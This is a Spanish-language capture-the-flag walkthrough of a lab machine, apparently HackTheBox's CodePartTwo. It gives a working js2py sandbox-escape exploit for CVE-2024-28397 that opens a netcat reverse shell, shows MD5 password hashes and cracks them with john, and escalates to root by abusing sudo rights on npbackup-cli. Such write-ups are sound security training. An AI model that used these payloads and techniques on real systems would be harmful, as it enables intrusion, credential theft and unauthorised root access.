### 1. Enumeración inicial

Empezamos la máquina enumerando los puertos que tiene abiertos:

```bash
sudo nmap -p- --open --min-rate 5000 -vvv -n -Pn 10.10.11.82 -oG allPorts
[sudo] contraseña para abra: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.98 ( https://nmap.org ) at 2025-11-10 17:10 +0000
Initiating SYN Stealth Scan at 17:10
Scanning 10.10.11.82 [65535 ports]
Discovered open port 22/tcp on 10.10.11.82
Discovered open port 8000/tcp on 10.10.11.82
Completed SYN Stealth Scan at 17:10, 14.11s elapsed (65535 total ports)
Nmap scan report for 10.10.11.82
Host is up, received user-set (0.072s latency).
Scanned at 2025-11-10 17:10:44 WET for 14s
Not shown: 62479 closed tcp ports (reset), 3054 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack ttl 63
8000/tcp open  http-alt syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.21 seconds
           Raw packets sent: 70152 (3.087MB) | Rcvd: 63571 (2.543MB)
```

Hay un servidor web en el puerto **8000**. 

---
### 2. Análisis del servidor web y explotación de CVE-2024-28397

Si entramos en la página nos topamos con que nos podemos registrar, al hacerlo veremos **un editor de código javascript**. También hay un enlace para bajarnos una aplicación. La descargamos, y analizandola, nos encontramos que el entorno usa un sandbox llamado **js2py**, el cuál usa una versión `0.74`, vulnerable a **Remote Code Execution** (**CVE-2024-28397**).

https://github.com/Ghost-Overflow/CVE-2024-28397-command-execution-poc/blob/main/payload.js

Vamos a pillar el PoC para explotar la vulnerabilidad, y **modificamos el payload para mandar una reverse shell a nuestra máquina de atacante**. Aseguraos de cambiar la dirección IP y el puerto de escucha por el de vuestra máquina.

```javascript
let cmd = "busybox nc 10.10.14.209 4444 -e /bin/bash"
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for (let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if (item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if (item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

// run the command and force UTF-8 string output
let proc = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true)
let out = proc.communicate()[0].decode("utf-8")

// return a plain string (JSON-safe)
"" + out
```

Si ejecutamos el exploit en el editor de código javascript de la página web veremos que recibimos una shell en nuestra máquina:

```bash
nc -nlvp 4444
Connection from 10.10.11.82:43582
ls
app.py
instance
__pycache__
requirements.txt
static
templates
whoami
app
```

Todavía no tenemos la user flag, toca enumerar la máquina.

---

### 3. Enumeración como usuario app y escalada a marco

Existe un usuario local **marco**, nuestro siguiente paso va a ser tratar de escalar privilegios y entrar con dicho usuario.

```bash
app@codeparttwo:~/app$ ls /home
app  marco
```

Hay un fichero `/home/app/instance/users.db`, con **sqlite3** podemos listar la información de la base de datos:

```bash
app@codeparttwo:~/app$ sqlite3 instance/users.db 
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .tables
code_snippet  user        
sqlite> SELECT * FROM user;
1|marco|649c9d65a206a75f5abe509fe128bce5
2|app|a97588c0e2fa3a024876339e27aeb42e
3|rootAbra|e10adc3949ba59abbe56e057f20f883e
4|jbkira|32580c1d5f8abb8b1eb2155139fee38f
5|pepe|7edede46f596b580cd10469463987280
```

Vemos varios usuarios, todos con la contraseña almacenada en **hash MD5**, vamos a crackear el hash correspondiente a **marco**:

Metemos el hash en un archivo `hash.txt` dentro de nuestra máquina local, y usamos **john** junto con el diccionario **rockyou.txt** 

```bash
john --format=raw-md5 hash.txt --wordlist=/home/abra/Documentos/rockyou.txt

Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=16
Note: Passwords longer than 18 [worst case UTF-8] to 55 [ASCII] rejected
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
sweetangelbabylove (marco)     
1g 0:00:00:00 DONE (2025-11-10 18:01) 3.704g/s 12772Kp/s 12772Kc/s 12772KC/s sweetart*..sweetali14'
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```

Tenemos las credenciales `marco:sweetangelbabylove`, vamos a loguearnos:

```bash
app@codeparttwo:~/app$ su marco
Password: 
marco@codeparttwo:/home/app/app$ whoami
marco
```

Con esto tenemos la user flag, ahora toca ir a por la root flag.

---

### 4. Lectura de root flag mediante npbackup-cli

Vamos a revisar los **permisos sudo** de marco:

```bash
marco@codeparttwo:~$ sudo -l
Matching Defaults entries for marco on codeparttwo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marco may run the following commands on codeparttwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

Podemos ejecutar el binario `/usr/local/bin/npbackup-cli` como root usando sudo. Probemos a ejecutarlo:

```bash
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli
2025-11-10 18:15:16,408 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2025-11-10 18:15:16,408 :: CRITICAL :: Cannot run without configuration file.
2025-11-10 18:15:16,415 :: INFO :: ExecTime = 0:00:00.010117, finished, state is: critical.
```

El binario sirve para realizar backups de ficheros en el sistema, mirando un poco el funcionamiento del mismo nos damos cuenta de que podemos especificar el archivo de configuración a usar.

En el home de marco hay un ejemplo de archivo de configuración para ese binario que podemos ejecutar como root, **lo copiamos a `/tmp` y le cambiamos el path a /root para que haga un backup del contenido de dicho directorio**:

```json
conf_version: 3.0.1
audience: public
repos:
  default:
    repo_uri:
      __NPBACKUP__wd9051w9Y0p4ZYWmIxMqKHP81/phMlzIOYsL01M9Z7IxNzQzOTEwMDcxLjM5N>
    repo_group: default_group
    backup_opts:
      paths:
      - /root         
      source_type: folder_list
      exclude_files_larger_than: 0.0
      ...
```

Ejecutamos el binario con sudo, especificando la ruta del archivo de configuración que modificamos para que realice el backup de **/root**:

```bash
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli --config-file /tmp/npbackup.conf -b
2025-11-10 18:17:58,594 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2025-11-10 18:17:58,622 :: INFO :: Loaded config E1057128 in /tmp/npbackup.conf
2025-11-10 18:17:58,632 :: INFO :: Searching for a backup newer than 1 day, 0:00:00 ago
2025-11-10 18:18:00,730 :: INFO :: Snapshots listed successfully
2025-11-10 18:18:00,732 :: INFO :: No recent backup found in repo default. Newest is from 2025-04-06 03:50:16.222832+00:00
2025-11-10 18:18:00,732 :: INFO :: Runner took 2.099909 seconds for has_recent_snapshot
2025-11-10 18:18:00,732 :: INFO :: Running backup of ['/root'] to repo default
2025-11-10 18:18:01,806 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/generic_excluded_extensions
2025-11-10 18:18:01,806 :: ERROR :: Exclude file 'excludes/generic_excluded_extensions' not found
2025-11-10 18:18:01,806 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/generic_excludes
2025-11-10 18:18:01,806 :: ERROR :: Exclude file 'excludes/generic_excludes' not found
2025-11-10 18:18:01,807 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/windows_excludes
2025-11-10 18:18:01,807 :: ERROR :: Exclude file 'excludes/windows_excludes' not found
2025-11-10 18:18:01,807 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/linux_excludes
2025-11-10 18:18:01,807 :: ERROR :: Exclude file 'excludes/linux_excludes' not found
2025-11-10 18:18:01,807 :: WARNING :: Parameter --use-fs-snapshot was given, which is only compatible with Windows
no parent snapshot found, will read all files

Files:          15 new,     0 changed,     0 unmodified
Dirs:            8 new,     0 changed,     0 unmodified
Added to the repository: 190.612 KiB (39.887 KiB stored)

processed 15 files, 197.660 KiB in 0:00
snapshot bcfc91eb saved
2025-11-10 18:18:02,967 :: INFO :: Backend finished with success
2025-11-10 18:18:02,969 :: INFO :: Processed 197.7 KiB of data
2025-11-10 18:18:02,969 :: ERROR :: Backup is smaller than configured minmium backup size
2025-11-10 18:18:02,969 :: ERROR :: Operation finished with failure
2025-11-10 18:18:02,970 :: INFO :: Runner took 4.338413 seconds for backup
2025-11-10 18:18:02,970 :: INFO :: Operation finished
2025-11-10 18:18:02,975 :: INFO :: ExecTime = 0:00:04.384188, finished, state is: errors.
```

Por último usando el binario leemos el fichero `/root/root.txt`.

```bash
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli --config-file /tmp/npbackup.conf --dump /root/root.txt

<AQUÍ_LA_ROOTFLAG>
```

Con esto hemos vulnerado con éxito la máquina.